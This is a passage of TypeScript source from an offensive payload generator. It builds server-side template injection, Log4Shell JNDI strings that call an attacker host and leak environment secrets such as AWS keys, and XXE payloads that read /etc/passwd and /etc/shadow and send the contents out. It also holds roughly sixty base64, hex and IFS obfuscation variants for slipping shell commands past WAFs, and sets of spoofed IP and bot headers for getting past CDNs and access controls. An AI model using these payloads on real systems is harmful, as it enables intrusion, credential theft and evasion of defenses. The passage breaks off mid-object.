        `{{request.application.__globals__.__builtins__.__import__('os').popen('${e}').read()}}`,
        `{% for x in ''.__class__.__mro__[1].__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('${e}').read()}}{% endif %}{% endfor %}`,
        `*{T(java.lang.Runtime).getRuntime().exec('${e}')}`,
        `\${T(java.lang.Runtime).getRuntime().exec('${e}')}`,
        `<%= system('${e}') %>`,
        `<%= \`${e}\` %>`,
        `#{system('${e}')}`,
        `#set($e="exp")$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"${e}")`,
        `{{7*'7'}}`,
      ].join("\n");
    }

    case "log4shell": {
      const lh = attackerIp; const lp = attackerPort;
      return [
        `\${jndi:ldap://${lh}:${lp}/exploit}`,
        `\${jndi:rmi://${lh}:${lp}/exploit}`,
        `\${jndi:dns://${lh}:${lp}/exploit}`,
        `\${jndi:corba://${lh}:${lp}/exploit}`,
        `\${j\${::-n}di:ldap://${lh}:${lp}/exploit}`,
        `\${j\${lower:n}di:ldap://${lh}:${lp}/exploit}`,
        `\${jndi:\${lower:l}dap://${lh}:${lp}/exploit}`,
        `\${j\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://${lh}:${lp}/exploit}`,
        `\${J\${::-N}\${::-D}\${::-I}:\${::-L}\${::-D}\${::-A}\${::-P}://${lh}:${lp}/exploit}`,
        `\${jndi:ldap://${lh}:${lp}/\${env:JAVA_VERSION}}`,
        `\${jndi:ldap://${lh}:${lp}/\${env:AWS_SECRET_ACCESS_KEY}}`,
        `\${jndi:ldap://${lh}:${lp}/\${sys:java.version}}`,
        `\${jndi:ldap://${lh}:${lp}/\${hostName}}`,
        `\${ind\${base64:aQ==}:\${::-l}dap://${lh}:${lp}/exploit}`,
        `%24%7Bjndi%3Aldap%3A%2F%2F${lh}%3A${lp}%2Fexploit%7D`,
        `\${jndi:ldap://\${env:NaN:-${lh}}:${lp}/exploit}`,
        `\${jndi:ldap://${lh}:${lp}/\${java:os}}`,
        `\${jndi:\${lower:l}\${lower:d}\${lower:a}\${lower:p}://${lh}:${lp}/exploit}`,
      ].join("\n");
    }

    case "xxe": {
      const xh = attackerIp; const xp = attackerPort;
      return [
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///etc/shadow">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///proc/self/environ">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///proc/self/cmdline">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "http://${xh}:${xp}/xxe?ssrf">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY % d SYSTEM "http://${xh}:${xp}/evil.dtd">%d;]><r></r>`,
        `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r[<!ENTITY x SYSTEM "expect://${raw.replace(/"/g,'\\"')}">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "dict://127.0.0.1:11211/stat">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "ftp://${xh}:${xp}/x">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>`,
        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY % p1 "<!ENTITY exfil SYSTEM 'http://${xh}:${xp}/?x=%25c;'>"><!ENTITY % c SYSTEM "file:///etc/passwd">%p1;]><r>&exfil;</r>`,
      ].join("\n");
    }

    case "polyglot": {
      const q  = raw.replace(/'/g, "\\'");
      const dq = raw.replace(/"/g, '\\"');
      return [
        `'; ${raw}; echo '`,
        `" && ${raw} && "`,
        `$(${raw})`,
        "`" + raw + "`",
        `'; ${raw}; {{${raw}}}; <!--${raw}-->; "`,
        `1' OR '1'='1'; ${raw}; --`,
        `<svg/onload="${dq}">`,
        `javascript:${raw}//`,
        `${raw}%0a${raw}%0d%0a${raw}`,
        `\r\n${raw}\r\n`,
        `\x00${raw}\x00`,
        `{${raw}}; ${raw}; \${${raw}}`,
        `'+(${raw})+'`,
        `\`;${raw};//`,
        `<script>eval("${dq}")</script>`,
        `{{constructor.constructor('${q}')()}}`,
      ].join("\n");
    }

    case "rev_shell":
      return buildReverseShells(attackerIp, attackerPort).slice(0, 8).join("\n");

    case "cloud":
      return buildCloudMetaPayloads(raw).join("\n");

    case "container":
      return buildContainerEscapes(raw).join("\n");

    case "timing":
      return buildTimingPayloads(7).join("\n");

    case "stealth":
      return buildStealthPayloads(raw).join("\n");

    case "windows":
      return buildWindowsPayloads(raw).join("\n");

    case "windows_timing":
      return buildWindowsTimingPayloads(7).join("\n");

    case "windows_rev":
      return buildWindowsReverseShells(attackerIp, attackerPort).join("\n");

    case "antiforensics":
      return buildAntiForensicsPayloads(raw).join("\n");

    default:
      return raw;
  }
}

/* ═══════════════════════════════════════════════════════════════════════════
   WAF BYPASS VARIANTS  —  60+ proven bypass techniques
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildWafBypass(payload: string): string {
  const B64    = b64(payload);
  const B64x2  = b64(B64);
  const B64u   = b64url(payload);
  const HEX    = hexEsc(payload);
  const OCT    = octEsc(payload);
  const RHEX   = rawHex(payload);
  const words  = payload.split(/\s+/);
  const broken = breakKeywords(payload);
  const brkDQ  = breakKeywordsDQ(payload);
  const splitC = splitConcat(payload);
  const ifsRep = payload.replace(/ /g, IFS);
  const tabRep = payload.replace(/ /g, TAB);

  const variants: string[] = [
    /* ── base64 ── */
    `{echo,${B64}}|{base64,-d}|bash`,
    `bash<<<$(echo${TAB}${B64}|base64${TAB}-d)`,
    `bash -c "$(echo${TAB}${B64}|base64${TAB}-d)"`,
    `{ _a="${B64x2}";bash<<<$(echo "$_a"|base64 -d|base64 -d); }`,
    `perl -MMIME::Base64 -e "system(decode_base64('${B64}'))"`,
    `python3 -c "import base64,os;os.system(base64.b64decode('${B64}').decode())"`,
    `ruby -e "require 'base64';system(Base64.decode64('${B64}'))"`,
    `node -e "require('child_process').execSync(Buffer.from('${B64}','base64').toString(),{stdio:'inherit'})"`,
    `echo${IFS}${B64}|base64${IFS}-d|bash`,
    `echo ${B64u}|python3 -c "import sys,base64,os;os.system(base64.urlsafe_b64decode(sys.stdin.read().strip()).decode())"`,
    `echo ${B64}|openssl enc -d -base64|bash`,
    /* ── hex ── */
    `eval "$(printf '${HEX}')"`,
    `eval "$(printf '${OCT}')"`,
    `perl -e "system(pack('H*','${RHEX}'))"`,
    `python3 -c "import os;os.system(bytes.fromhex('${RHEX}').decode())"`,
    `echo ${RHEX}|xxd -r -p|bash`,
    `bash -c "$(printf '%b' '${HEX}')"`,
    `{ _NX="$(printf '${HEX}')"; eval "$_NX"; }`,
    `ruby -e "system([${charCodes(payload)}].pack('C*'))"`,
    `node -e "require('child_process').execSync(Buffer.from('${RHEX}','hex').toString(),{stdio:'inherit'})"`,
    `printf '${HEX}'|bash`,
    `printf '%b' '${HEX}'|bash`,
    `echo ${RHEX}|perl -pe 's/([0-9a-f]{2})/chr(hex($1))/gie'|bash`,
    /* ── IFS ── */
    ifsRep,
    tabRep,
    `{ IFS=,; set -- ${words.join(",")}; "$@"; }`,
    payload.replace(/ /g, "${IFS:0:1}"),
    payload.replace(/ /g, "$'\\x20'"),
    payload.replace(/ /g, "$'\\t'"),
    /* ── keyword break ── */
    broken,
    brkDQ,
    splitC,
    /* ── wildcard ── */
    `/???/b??h -c ${JSON.stringify(payload)}`,
    `/???/b??h<<<$(echo${TAB}${B64}|base64${TAB}-d)`,
    `/[b][i][n]/[b][a][s][h] -c ${JSON.stringify(payload)}`,
    `{b,}a{s,}h -c ${JSON.stringify(payload)}`,
    /* ── variable env ── */
    `X=${JSON.stringify(payload)};bash -c "$X"`,
    `{ read _NX<<<${JSON.stringify(payload)};bash -c "$_NX"; }`,
    `$(which bash) -c ${JSON.stringify(payload)}`,
    `declare _NX=${JSON.stringify(payload)};eval "$_NX"`,
    `BASH_ENV=/dev/stdin bash <<<${JSON.stringify(payload)}`,
    /* ── process substitution ── */
    `source <(echo ${B64}|base64 -d)`,
    `. <(echo ${B64}|base64 -d)`,
    `bash <(printf '${HEX}')`,
    /* ── ansi-c ── */
    `bash -c $'${payload.replace(/\\/g,"\\\\").replace(/'/g,"\\'")}' `,
    /* ── brace ── */
    `{echo,${B64}}|{base64,-d}|{bash,}`,
    /* ── heredoc ── */
    `bash<<<$(echo${IFS}${B64}|base64${IFS}-d)`,
    /* ── encoding ── */
    urlEnc(payload),
    dblUrlEnc(payload),
    htmlEnc(payload),
    /* ── python exec ── */
    `python3 -c "exec(__import__('base64').b64decode('${B64}').decode())"`,
    /* ── rev ── */
    `echo ${JSON.stringify(payload.split("").reverse().join(""))}|rev|bash`,
    /* ── xargs ── */
    `echo ${JSON.stringify(payload)}|xargs -I{} bash -c {}`,
    /* ── printf chain ── */
    printfBuild(payload),
    `$(printf '${HEX}')`,
    /* ── null byte ── */
    `${payload}$'\\x00'`,
    /* ── varslice ── */
    varSlice(payload),
    /* ── charcode build ── */
    `python3 -c "import os;os.system(bytes([${charCodes(payload)}]).decode())"`,
    `node -e "require('child_process').execSync(String.fromCharCode(${charCodes(payload)}),{stdio:'inherit'})"`,
  ];

  /* ── Unicode confusable / full-width ── */
  const FW = (s: string) => [...s].map(c => {
    const code = c.charCodeAt(0);
    if (code >= 0x21 && code <= 0x7e) return String.fromCharCode(code + 0xff00 - 0x0020);
    return c;
  }).join("");
  /* ── Mixed-case keyword bypass ── */
  const mcCmd = payload.replace(/[a-zA-Z]/g, (c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase());

  variants.push(
    /* ── unicode/fullwidth obfuscation ── */
    FW(payload),
    urlEnc(FW(payload)),
    /* ── mixed-case ── */
    mcCmd,
    /* ── null byte injection points ── */
    `${payload}\x00`,
    `\x00${payload}`,
    `${payload}%00`,
    `${payload}%00;id`,
    /* ── line-continuation ── */
    payload.replace(/ /g, "\\\n"),
    /* ── CRLF injection in param ── */
    `${payload}%0d%0a`,
    `%0d%0a${payload}`,
    /* ── form-feed / vertical tab ── */
    payload.replace(/ /g, "\f"),
    payload.replace(/ /g, "\v"),
    /* ── empty-string glitch ── */
    payload.replace(/([a-zA-Z])/g, "$1\$()"),
    /* ── brace expansion no-space ── */
    `{${breakKeywords(payload)}}`,
    /* ── $'\nnn' ANSI-C quoting ── */
    `$'${octEsc(payload)}'`,
    /* ── here-string with IFS ── */
    `bash${IFS}<<<${JSON.stringify(payload)}`,
    /* ── triple-URL-encoded ── */
    [...Buffer.from(payload)].map(b => `%25${(b as number).toString(16).padStart(2,"0").toUpperCase()}`).join(""),
    /* ── tab-separated heredoc ── */
    `bash${TAB}<<${TAB}EOF
${payload}
EOF`,
    /* ── dollar-at letter splitting ── */
    payload.split("").join("$@"),
    /* ── case-modifier obfuscation ── */
    `${payload.toUpperCase()}`,
    /* ── arithmetic bypass ── */
    `;$((1))&&${payload}`,
    /* ── subshell via coprocess ── */
    `coproc _NX { ${payload}; }; cat <&$_NX 2>/dev/null`,
    /* ── environment variable chain ── */
    (() => {
      const words = payload.split(" ");
      const envs  = words.map((w, i) => `_NXW${i}=${JSON.stringify(w)}`).join(";");
      const exec  = words.map((_, i) => `$_NXW${i}`).join(" ");
      return `${envs};${exec}`;
    })(),
    /* ── bash -x debug mode ── */
    `bash -x -c ${JSON.stringify(payload)} 2>&1`,
    /* ── set +e to ignore errors ── */
    `set +e;${payload}`,
    /* ── multiple separators combo ── */
    `;${payload}#comment`,
    `${payload}${IFS}2>/dev/null`,
    `${payload};true`,
    `${payload}||true`,
  );

  return [...new Set(variants)].join("\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
   HTTP BYPASS HEADERS
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildHttpBypassHeaders(): Array<Record<string, string>> {
  const RFC_IPS = ["127.0.0.1","127.0.0.2","10.0.0.1","10.0.0.127","192.168.0.1","192.168.1.1","172.16.0.1","0.0.0.0","::1","::ffff:127.0.0.1"];
  const ip  = () => RFC_IPS[Math.floor(Math.random() * RFC_IPS.length)]!;
  const rid = () => Math.random().toString(36).slice(2, 10);

  const chrome126Win = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36";
  const chrome126Lin = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36";
  const ff128Lin     = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0";
  const ff128Win     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0";
  const safari17mac  = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15";
  const edge126      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36 Edg/126.0.2592.87";
  const chromeMobile = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.128 Mobile Safari/537.36";
  const gbot         = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
  const bingbot      = "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)";

  return [
    {
      "User-Agent": chrome126Win,
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
      "Accept-Encoding": "gzip, deflate, br",
      "Connection": "keep-alive",
      "Upgrade-Insecure-Requests": "1",
      "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1",
      "sec-ch-ua": `"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"`,
      "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
      "X-Forwarded-For": `${ip()}, ${ip()}`, "X-Real-IP": ip(),
    },
    {
      "User-Agent": ff128Lin,
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Connection": "keep-alive",
      "Upgrade-Insecure-Requests": "1",
      "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-Site": "cross-site", "Sec-Fetch-User": "?1",
      "X-Forwarded-For": "127.0.0.1",
      "X-Original-URL": "/", "X-Rewrite-URL": "/",
    },
    {
      "User-Agent": safari17mac,
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
      "Accept-Encoding": "gzip, deflate, br",
      "Connection": "keep-alive",
      "X-Forwarded-For": ip(), "X-Real-IP": ip(),
      "X-Forwarded-Proto": "https", "X-Forwarded-Port": "443",
    },
    {
      "User-Agent": edge126,
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
      "Accept-Encoding": "gzip, deflate, br",
      "Connection": "keep-alive",
      "sec-ch-ua": `"Not/A)Brand";v="8", "Chromium";v="126", "Microsoft Edge";v="126"`,
      "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
      "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-Site": "none",
      "X-Forwarded-For": "::1", "X-Real-IP": "::1",
    },
    {
      "User-Agent": chrome126Win,
      "Accept": "application/json, text/plain, */*",
      "Accept-Language": "en-US,en;q=0.9",
      "Accept-Encoding": "gzip, deflate, br",
      "Connection": "keep-alive",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest",
      "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-origin",
      "sec-ch-ua": `"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"`,
      "X-Forwarded-For": ip(),
    },
    {
      "User-Agent": ff128Win,
      "Accept": "application/json, text/javascript, */*; q=0.01",
      "Accept-Language": "en-US,en;q=0.5",
      "Accept-Encoding": "gzip, deflate, br",
      "X-Requested-With": "XMLHttpRequest",
      "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-origin",
      "Referer": "https://www.google.com/",
      "X-Forwarded-For": ip(),
    },
    {
      "User-Agent": chromeMobile,
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
      "Accept-Encoding": "gzip, deflate, br",
      "sec-ch-ua": `"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"`,
      "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"',
      "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
      "X-Forwarded-For": ip(),
    },
    {
      "User-Agent": gbot,
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Encoding": "gzip, deflate",
      "From": "googlebot(at)googlebot.com",
      "X-Forwarded-For": "66.249.66.1",
      "X-Real-IP": "66.249.66.1",
    },
    {
      "User-Agent": bingbot,
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Encoding": "gzip, deflate",
      "From": "bingbot(at)microsoft.com",
      "X-Forwarded-For": "40.77.167.0",
    },
    {
      "User-Agent": chrome126Lin,
      "Accept": "*/*",
      "Accept-Language": "en-US,en;q=0.9",
      "Accept-Encoding": "gzip, deflate, br",
      "Referer": "https://www.google.com/",
      "Origin": "https://www.google.com",
      "X-Forwarded-For": `${ip()}, ${ip()}, ${ip()}`,
      "X-Real-IP": ip(),
      "Via": `1.1 ${ip()}`,
      "Forwarded": `for=${ip()};proto=https`,
      "True-Client-IP": ip(),
      "CF-Connecting-IP": ip(),
    },
    {
      "User-Agent": chrome126Win,
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
      "X-Forwarded-For": "127.0.0.1",
      "X-Originating-IP": "127.0.0.1",
      "X-Client-IP": "127.0.0.1",
      "X-Host": "localhost",
      "X-Forwarded-Host": "localhost",
      "X-Forwarded-Server": "localhost",
      "X-Custom-IP-Authorization": "127.0.0.1",
    },
    {
      "User-Agent": ff128Lin,
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "X-HTTP-Method-Override": "GET",
      "X-Method-Override": "GET",
      "X-Forwarded-For": "0.0.0.0",
      "X-Real-IP": "0.0.0.0",
      "X-Cluster-Client-IP": "0.0.0.0",
      "X-Request-ID": rid(),
    },
    {
      "User-Agent": safari17mac,
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-GB,en;q=0.9",
      "Accept-Encoding": "gzip, deflate, br",
      "Cache-Control": "max-age=0",
      "X-Forwarded-For": ip(),
      "X-Azure-SocketIP": ip(), "X-Azure-ClientIP": ip(), "X-MS-Client-IP": ip(),
    },
    {
      "User-Agent": edge126,
      "Accept": "*/*",
      "Accept-Encoding": "gzip, deflate, br",
      "Connection": "keep-alive",
      "Transfer-Encoding": "chunked",
      "TE": "trailers",
      "X-Forwarded-For": ip(),
      "X-Wap-Profile": `http://${ip()}/wap.xml`,
    },
    {
      "User-Agent": chrome126Lin,
      "Accept": "application/json, text/plain, */*",
      "Accept-Language": "en-US,en;q=0.9",
      "Accept-Encoding": "gzip, deflate, br",
      "Content-Type": "application/json;charset=utf-8",
      "X-CSRF-Token": "null",
      "X-Request-ID": rid(),
      "X-Forwarded-For": `${ip()}, ${ip()}`,
      "X-ProxyUser-Ip": ip(),
    },
    /* ── Chrome 131 (latest stable as of 2025) ── */
    {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "Accept-Language": "en-US,en;q=0.9",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "sec-ch-ua": '"Google Chrome";v="131","Chromium";v="131","Not_A Brand";v="24"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-ch-ua-platform-version": '"15.0.0"',
      "Sec-Fetch-Dest": "document",
      "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-Site": "none",
      "Sec-Fetch-User": "?1",
      "Upgrade-Insecure-Requests": "1",
      "X-Forwarded-For": ip(),
      "X-Real-IP": ip(),
    },
    /* ── Firefox 133 ── */
    {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Sec-Fetch-Dest": "document",
      "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-Site": "cross-site",
      "Priority": "u=0, i",
      "X-Forwarded-For": ip(),
      "X-Real-IP": ip(),
    },
    /* ── Cloudflare edge IP bypass (CF-Connecting-IP spoofing) ── */
    {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
      "CF-Connecting-IP": "127.0.0.1",
      "CF-IPCountry": "US",
      "CF-RAY": `${rid()}-IAD`,
      "CF-Visitor": '{"scheme":"https"}',
      "X-Forwarded-For": "127.0.0.1",
      "X-Real-IP": "127.0.0.1",
      "True-Client-IP": "127.0.0.1",
    },
    /* ── AWS CloudFront bypass ── */
    {
      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
      "Accept": "*/*",
      "Accept-Encoding": "gzip, deflate, br",
      "X-Forwarded-For": "127.0.0.1",
      "X-Amzn-Trace-Id": `Root=1-${rid()}-${rid()}`,
      "X-Amz-Cf-Id": rid(),
      "Via": `1.1 ${rid()}.cloudfront.net (CloudFront)`,
      "X-Real-IP": "127.0.0.1",
    },
    /* ── Azure Front Door bypass ── */
    {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Encoding": "gzip, deflate, br",
      "X-Azure-SocketIP": "127.0.0.1",
      "X-Azure-ClientIP": "127.0.0.1",
      "X-FD-HealthProbe": "1",
      "X-Forwarded-For": "127.0.0.1",
      "X-Real-IP": "127.0.0.1",
    },
    /* ── Fastly CDN bypass ── */
    {
      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Fastly-Client-IP": "127.0.0.1",
      "X-Forwarded-For": "127.0.0.1",
      "X-Real-IP": "127.0.0.1",
      "Fastly-SSL": "1",
    },
    /* ── Akamai edge bypass ── */
    {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
      "Accept": "*/*",
      "Accept-Encoding": "gzip, deflate, br",
      "X-Akamai-CIP": "127.0.0.1",
      "True-Client-IP": "127.0.0.1",
      "X-Forwarded-For": "127.0.0.1",
      "Akamai-Origin-Hop": "1",
      "X-Check-Cacheable": "YES",
    },
    /* ── Internal load-balancer trust header ── */
    {
      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
      "Accept": "application/json, text/plain, */*",
      "Accept-Encoding": "gzip, deflate",
      "X-Forwarded-For": "127.0.0.1",
      "X-Real-IP": "127.0.0.1",
      "X-Internal-IP": "127.0.0.1",
      "X-Originating-IP": "127.0.0.1",
      "X-Remote-IP": "127.0.0.1",
      "X-Remote-Addr": "127.0.0.1",
      "X-Trusted-IP": "127.0.0.1",
      "Forwarded": "for=127.0.0.1;proto=https;by=127.0.0.1",
    },
    /* ── Content-type variation bypass ── */
    {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
      "Accept": "*/*",
      "Accept-Encoding": "gzip, deflate, br",
      "Content-Type": "application/x-www-form-urlencoded ; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest",
      "X-Forwarded-For": ip(),
      "X-Real-IP": ip(),
      "Origin": "null",
    },
    /* ── Admin / internal bypass headers ── */
    {
      "User-Agent": "Mozilla/5.0 (compatible; internal-health-check/1.0)",
      "Accept": "*/*",
      "Accept-Encoding": "gzip, deflate",
      "X-Forwarded-For": "127.0.0.1",
      "X-Real-IP": "127.0.0.1",
      "X-Forwarded-Host": "localhost",
      "X-Forwarded-Server": "localhost",
      "X-Forwarded-Port": "80",
      "X-Original-URL": "/",
      "X-Rewrite-URL": "/",
      "X-Custom-IP-Authorization": "127.0.0.1",
      "X-ProxyUser-Ip": "127.0.0.1",
    },
    /* ── Sucuri WAF bypass ── */
    {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
      "Accept": "*/*",
      "Accept-Encoding": "gzip, deflate, br",
      "X-Forwarded-For": "127.0.0.1",
      "X-Real-IP": "127.0.0.1",
      "X-Sucuri-Clientip": "127.0.0.1",
      "X-Sucuri-Country": "US",
    },
    /* ── Barracuda WAF bypass ── */
    {
      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "X-Forwarded-For": "127.0.0.1",
      "X-Real-IP": "127.0.0.1",
      "BWCE-Bypass": "1",
      "X-Barracuda-Bypass": "1",
    },
    /* ── Varnish CDN bypass ── */
    {
      "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15",
      "Accept": "*/*",
      "Accept-Encoding": "gzip, deflate, br",
      "X-Forwarded-For": "127.0.0.1",
      "X-Real-IP": "127.0.0.1",
      "X-Varnish": "12345678",
      "X-Forwarded-Proto": "https",
    },
    /* ── Nginx proxy bypass ── */
    {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
      "Accept": "text/html,*/*;q=0.8",
      "Accept-Encoding": "gzip, deflate",
      "X-Forwarded-For": "127.0.0.1",
      "X-Real-IP": "127.0.0.1",
      "X-NginX-Proxy": "true",
      "X-Nginx-Cache": "BYPASS",
    },
    /* ── Traefik / HAProxy bypass ── */
    {
      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
      "Accept": "*/*",
      "Accept-Encoding": "gzip, deflate, br",
      "X-Forwarded-For": "127.0.0.1",
      "X-Real-IP": "127.0.0.1",
      "X-Forwarded-Proto": "https",
      "X-Forwarded-Port": "443",
    },
    /* ── StackPath / MaxCDN bypass ── */
    {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "X-Forwarded-For": "127.0.0.1",
      "X-SP-Forwarded-IP": "127.0.0.1",
      "X-Real-IP": "127.0.0.1",
    },
    /* ── Reflected-XFF loopback chain ── */
    {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
      "Accept": "*/*",
